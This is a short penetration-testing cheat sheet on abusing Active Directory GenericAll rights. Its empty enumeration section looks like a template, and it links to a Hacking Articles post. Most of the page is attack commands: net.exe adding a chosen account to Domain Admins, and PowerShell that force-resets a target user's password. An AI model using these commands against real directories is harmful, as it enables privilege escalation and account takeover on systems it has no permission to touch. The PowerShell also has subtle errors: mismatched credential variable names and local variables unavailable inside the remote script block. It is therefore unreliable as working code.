# Living off the Land

## 01 - Enumerate

> [!IMPORTANT] Conditions
> Write the conditions...

```

```

## 02 - Exploit

### 2.1 - Command Prompt

```
C:\> net.exe group "Domain Admins" <target_username> /add /domain
```

### 2.2 - PowerShell

Set the credentials to exploit the permission.

```powershell
PS C:\> $username = '<username>'
$password = '<password>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
```

Pass the target account to reset the password.

```powershell
$targetusername = "<username>"
$newpassword = ConvertTo-SecureString -AsPlainText 'Password1234!' -Force
Invoke-Command -ComputerName 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity $targetusername -Reset -NewPassword $newpassword} -Credential $credentials
```

---
## References

### Hacking Articles

- [Hacking Articles: Abusing AD-DACL - Generic ALL Permissions](https://www.hackingarticles.in/abusing-ad-dacl-generic-all-permissions/)